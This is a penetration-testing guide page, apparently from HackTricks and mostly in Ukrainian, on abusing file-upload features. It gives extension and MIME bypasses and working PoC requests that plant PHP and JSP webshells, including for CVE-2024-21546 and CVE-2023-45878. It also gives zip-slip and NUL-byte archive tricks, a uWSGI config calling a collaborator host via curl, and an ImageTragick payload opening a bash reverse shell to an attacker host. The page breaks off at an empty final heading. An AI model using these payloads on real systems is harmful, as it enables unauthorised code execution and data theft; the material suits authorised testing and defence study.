# Завантаження файлів

{{#include ../../banners/hacktricks-training.md}}

## Загальна методологія завантаження файлів

Інші корисні розширення:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Обхід перевірок розширень файлів

1. Якщо застосовано, **перевірте** попередні розширення. Також тестуйте їх, використовуючи кілька **прописних літер**: _pHp, .pHP5, .PhAr ..._
2. _Перевірте **додавання валідного розширення перед** виконуваним розширенням (також використовуйте попередні розширення):_
- _file.png.php_
- _file.png.Php5_
3. Спробуйте додати **спеціальні символи в кінці.** Можна використати Burp для **bruteforce** всієї **ascii** та **Unicode** множини символів. (_Зауважте, що також можна спробувати використати **раніше** згадані **розширення**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Спробуйте обійти захист, **обманюючи парсер розширень** на сервері за допомогою технік, таких як **подвоєння** **розширення** або **додавання сміттєвих** даних (байтів **null**) між розширеннями. _Ви також можете використати **попередні розширення** для підготовки кращого payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Додайте **ще один шар розширень** до попередньої перевірки:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Спробуйте розмістити **виконавче розширення перед дійсним розширенням** і сподівайтеся, що сервер некоректно налаштований. (корисно для експлуатації misconfigurations Apache, де будь-що з розширенням **.php**, але не обов'язково що закінчується на .php, виконуватиме код):
- _ex: file.php.png_
7. Використання **NTFS alternate data stream (ADS)** у **Windows**. У цьому випадку після забороненого розширення й перед дозволеним буде вставлено символ двокрапки ":". В результаті на сервері буде створено **порожній файл із забороненим розширенням** (наприклад "file.asax:.jpg"). Цей файл може бути відредагований пізніше іншими техніками, такими як використання його короткого імені. Шаблон "**::$data**" також може бути використаний для створення непорожніх файлів. Тому додавання крапки після цього шаблону також може бути корисним для обходу додаткових обмежень (наприклад "file.asp::$data").
8. Спробуйте перевищити обмеження довжини імені файлу. Дійсне розширення обрізається, а шкідливий PHP залишається. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Деякі upload handlers обрізають або нормалізують кінцеві крапки у збереженому імені файлу. В UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) версіях до 2.9.1 можна обійти перевірку розширення, якщо:

- Використати валідний image MIME та magic header (наприклад PNG’s `\x89PNG\r\n\x1a\n`).
- Назвати завантажений файл з PHP-розширенням, після якого іде крапка, наприклад `shell.php.`.
- Сервер видаляє кінцеву крапку і зберігає `shell.php`, який буде виконуватись, якщо він розміщений у web-served директорії (за замовчуванням public storage, наприклад `/storage/files/`).

Мінімальний PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Потім зверніться до збереженого шляху (типово для Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Обхід Content-Type, Magic Number, Compression & Resizing

- Обійти перевірки **Content-Type**, встановивши **value** заголовка **Content-Type** в: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Обійти перевірку **magic number**, додавши на початок файлу **bytes of a real image** (заплутати _file_ команду). Або вбудувати shell всередину **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` або ви також можете **вставити payload безпосередньо** в зображення:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Якщо до вашого зображення додається **compression**, наприклад через стандартні PHP-бібліотеки на кшталт [PHP-GD](https://www.php.net/manual/fr/book.image.php), попередні техніки можуть не спрацювати. Однак можна використати **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), щоб вставити текст, який **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Веб-сторінка також може **resizing** зображення, наприклад використовуючи функції PHP-GD `imagecopyresized` або `imagecopyresampled`. Проте можна використати **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), щоб вставити текст, який **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Інша техніка для створення payload, який **survives an image resizing**, використовуючи PHP-GD функцію `thumbnailImage`. Проте можна використати **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), щоб вставити текст, який **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Інші трюки для перевірки

- Знайдіть вразливість, щоб **rename** файл, який вже завантажено (щоб змінити розширення).
- Знайдіть вразливість **Local File Inclusion**, щоб виконати backdoor.
- **Можливе розголошення інформації**:
1. Завантажуйте **кілька разів** (і одночасно) **той самий файл** з **однаковим ім'ям**
2. Завантажте файл з **ім'ям** іншого **файлу** або **папки**, що **вже існує**
3. Завантаження файлу з **"." , "..", or "…" as its name**. Наприклад, в Apache на **Windows**, якщо додаток зберігає завантажені файли в директорії "/www/uploads/", filename "." створить файл called
uploads” in the "/www/" directory.
4. Завантажте файл, який може бути важко видалити, наприклад **"…:.jpg"** в **NTFS**. (Windows)
5. Завантажте файл в **Windows** з **invalid characters** такими як `|<>*?”` в імені. (Windows)
6. Завантажте файл в **Windows**, використовуючи **reserved** (**forbidden**) **names**, такі як CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Також спробуйте **upload an executable** (.exe) або **.html** (менш підозріле), яке **will execute code** при випадковому відкритті жертвою.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Виконання payload відбувається під час парсингу конфігураційного файлу. Щоб конфігурація активувалася та була розпарсена, процес uWSGI має бути перезапущений (наприклад після крашу або через Denial of Service attack) або файл має бути встановлений на auto-reload. Якщо функція auto-reload увімкнена, вона перезавантажує файл через задані інтервали після виявлення змін.

Важливо розуміти м'яку природу парсингу конфігураційних файлів uWSGI. Конкретно, обговорюваний payload можна вставити в binary файл (наприклад image або PDF), що ще більше розширює можливі вектори експлуатації.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Неаутентифікований endpoint у Gibbon LMS дозволяє довільно записувати файли у web root, що призводить до pre-auth RCE шляхом розміщення PHP файлу. Уразливі версії: до 25.0.01 включно.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Потрібні параметри:
- `img`: data-URI-like string: `[mime];[name],[base64]` (сервер ігнорує type/name, base64-декодує хвіст)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Мінімальний PoC для запису та читання файлу:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Завантажити мінімальний webshell і виконувати команди:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Примітки:
- Обробник виконує `base64_decode($_POST["img"])` після розбиття за `;` і `,`, потім записує байти в `$absolutePath . '/' . $_POST['path']` без перевірки розширення/типу.
- Отриманий код виконується від імені користувача веб-сервісу (наприклад, XAMPP Apache на Windows).

Посилання щодо цієї уразливості включають usd HeroLab advisory та запис у NVD. Див. розділ References нижче.

## **wget File Upload/SSRF Trick**

Іноді можна виявити, що сервер використовує **`wget`** для **завантаження файлів**, і ви можете вказати **URL**. У таких випадках код може перевіряти, що розширення завантажуваних файлів присутнє у whitelist, щоб гарантувати, що завантажуються тільки дозволені файли. Однак **цю перевірку можна обійти.**  
Максимальна довжина імені файлу в **linux** — **255** символів, проте **wget** обрізає імена файлів до **236** символів. Ви можете **завантажити файл з іменем "A"*232+".php"+".gif"**, це ім'я файлу **обійде** **перевірку** (у цьому прикладі **".gif"** — **дозволене** розширення), але `wget` **перейменує** файл на **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Зверніть увагу, що **ще один варіант**, про який ви можете подумати щоб обійти цю перевірку — змусити **HTTP server redirect to a different file**, тож початковий URL пройде перевірку, а потім wget завантажить перенаправлений файл з новою назвою. Це **не спрацює** **якщо тільки** wget не використовується з **параметром** `--trust-server-names`, оскільки **wget завантажить перенаправлену сторінку з ім'ям файлу, вказаним в оригінальному URL**.

### Вихід за межі каталогу завантажень через NTFS junctions (Windows)

(Для цієї атаки потрібен локальний доступ до машини Windows) Коли завантаження зберігаються в підпапках для кожного користувача на Windows (наприклад, C:\Windows\Tasks\Uploads\<id>\) і ви контролюєте створення/видалення цього підпапки, ви можете замінити її на directory junction, що вказує на чутливе місце (наприклад, webroot). Наступні завантаження будуть записані в цільовий шлях, що дозволяє виконання коду, якщо ціль інтерпретує server‑side code.

Приклад послідовності для перенаправлення завантажень у XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Примітки
- mklink /J створює NTFS directory junction (reparse point). Обліковий запис веб‑сервера має переходити за junction і мати дозвіл на запис у місці призначення.
- Це перенаправляє довільні записи файлів; якщо місце призначення виконує скрипти (PHP/ASP), це перетворюється на RCE.
- Захист: не дозволяйте, щоб writable upload roots були контрольовані атакуючим під C:\Windows\Tasks або подібними; блокувати створення junction; перевіряти розширення на стороні сервера; зберігати uploads на окремому томі або з ACL, що забороняють виконання.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Деякі upload/ingest handlers записують сире тіло запиту у файловий шлях, який формується з параметрів запиту, контрольованих користувачем. Якщо обробник також підтримує Content-Encoding: gzip і не нормалізує/не перевіряє шлях призначення, можна поєднати directory traversal зі gzipped payload, щоб записати довільні байти в директорію, яку обслуговує веб‑сервер, і отримати RCE (наприклад, вкинути JSP у webapps Tomcat).

Загальний алгоритм експлуатації:
- Підготуйте серверний payload (наприклад, мінімальний JSP webshell) і стисніть байти gzip.
- Надішліть POST, де параметр шляху (наприклад, token) містить directory traversal, що виходить за межі призначеної теки, а file вказує ім'я файлу для збереження. Встановіть Content-Type: application/octet-stream та Content-Encoding: gzip; тіло — стиснений payload.
- Перейдіть до записаного файлу у браузері, щоб викликати виконання.

Ілюстративний запит:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Потім запустіть:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notes
- Target paths vary by install (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). Any web-exposed folder that executes JSP will work.
- Burp Suite’s Hackvertor extension can produce a correct gzip body from your payload.
- This is a pure pre-auth arbitrary file write → RCE pattern; it does not rely on multipart parsing.

Mitigations
- Визначайте призначення завантаження на стороні сервера; ніколи не довіряйте фрагментам шляху від клієнтів.
- Canonicalize та забезпечуйте, щоб розв'язаний шлях залишався в межах allow-listed базової директорії.
- Зберігайте uploads на не-виконуваному томі й забороняйте виконання скриптів із записуваних шляхів.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

Деякі застарілі upload handlers, що використовують `snprintf()` або подібні для побудови multi-file масивів із single-file upload, можна обманути, щоб сфальшувати структуру `_FILES`. Через невідповідності та усікання в поведінці `snprintf()` ретельно сформоване single upload може виглядати як кілька проіндексованих файлів на стороні сервера, збиваючи з пантелику логіку, яка припускає сувору форму (наприклад, трактуючи це як multi-file upload і вибираючи небезпечні гілки). Хоча сьогодні це нішевий випадок, цей патерн «index corruption» іноді з'являється в CTFs та в старих кодових базах.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **антивірус**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Розпаковувати в різні папки

Несподіване створення файлів у директоріях під час розпакування є серйозною проблемою. Незважаючи на початкові припущення, що така конфігурація може захистити від OS-level command execution через шкідливі завантаження файлів, ієрархічна підтримка стиснення та можливості directory traversal формату ZIP можуть бути експлуатовані. Це дозволяє атакуючим обходити обмеження й виходити за межі захищених директорій завантаження, маніпулюючи функціями розпакування цільового застосунку.

Автоматизований експлоїт для створення таких файлів доступний за адресою [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Утилітою можна користуватися так:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Крім того, **symlink trick with evilarc** — це варіант. Якщо метою є націлитися на файл, наприклад `/flag.txt`, слід створити symlink на цей файл у вашій системі. Це гарантує, що evilarc не зіткнеться з помилками під час своєї роботи.

Нижче наведено приклад коду Python, який використовується для створення шкідливого zip-файлу:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Зловживання стисненням для file spraying**

Для детальнішої інформації **перегляньте оригінальний допис за**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Створення PHP Shell**: Пишеться PHP-код, який виконує команди, передані через змінну `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Створюється кілька файлів і збирається zip-архів, що містить ці файли.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Імена файлів всередині zip змінюються за допомогою vi або a hex editor, замінюючи "xxA" на "../" для переходу в батьківські директорії.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Коли backend валідовує записи ZIP, використовуючи PHP’s ZipArchive, але при розпакуванні записує у файлову систему сирі імена, можна провезти заборонене розширення, вставивши NUL (0x00) у поля імен файлів. ZipArchive трактує ім'я запису як C‑string і обрізає його на першому NUL; файлова система ж записує повне ім'я, відкидаючи все після NUL.

Загальний потік:
- Підготуйте легітимний контейнерний файл (наприклад, дійсний PDF), який вбудовує крихітний PHP stub у stream, щоб magic/MIME залишалися PDF.
- Назвіть його наприклад `shell.php..pdf`, zip it, потім hex‑edit локальний заголовок ZIP і ім'я в central directory, замінивши першу `.` після `.php` на `0x00`, в результаті отримаєте `shell.php\x00.pdf`.
- Валідатори, що покладаються на ZipArchive, «побачать» `shell.php .pdf` і дозволять його; екстрактор запише `shell.php` на диск, що призведе до RCE, якщо папка завантаження є виконуваною.

Мінімальні кроки PoC:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Примітки
- Change BOTH filename occurrences (local and central directory). Some tools add an extra data descriptor entry too – adjust all name fields if present.
- The payload file must still pass server‑side magic/MIME sniffing. Embedding the PHP in a PDF stream keeps the header valid.
- Працює в ситуаціях, коли enum/validation path і extraction/write path по-різному обробляють рядки.

### Stacked/concatenated ZIPs (parser disagreement)

Конкатенація двох валідних ZIP файлів створює blob, де різні парсери зосереджуються на різних EOCD записах. Багато інструментів шукають останній End Of Central Directory (EOCD), тоді як деякі бібліотеки (наприклад, ZipArchive у певних workflows) можуть парсити перший архів, який вони знаходять. Якщо validation перераховує перший архів, а для екстракції використовується інший інструмент, що враховує останній EOCD, безпечний архів може пройти перевірки, тоді як шкідливий буде витягнутий.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Схема зловживання
- Створіть безпечний архів (дозволений тип, наприклад PDF) та другий архів, що містить заблоковане розширення (наприклад, `shell.php`).
- Об'єднайте їх: `cat benign.zip evil.zip > combined.zip`.
- Якщо сервер валідує одним парсером (бачить benign.zip), але розпаковує іншим (опрацьовує evil.zip), заблокований файл потрапляє в шлях розпакування.

## ImageTragic

Завантажте цей вміст з розширенням зображення, щоб експлуатувати вразливість **(ImageMagick , 7.0.1-1)** (з [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Вбудовування PHP shell у PNG

Вбудовування PHP shell в IDAT-чанк PNG-файлу може ефективно обійти певні операції обробки зображень. Функції `imagecopyresized` та `imagecopyresampled` з PHP-GD особливо релевантні в цьому контексті, оскільки їх зазвичай використовують для зміни розмірів та ресемплінгу зображень відповідно. Здатність вбудованого PHP shell залишатися неушкодженим цими операціями є суттєвою перевагою в певних сценаріях.

Детальний розбір цієї техніки, включно з методологією та потенційними застосуваннями, наведено в наступній статті: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Це джерело дає всебічне розуміння процесу та його наслідків.

Докладніше: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

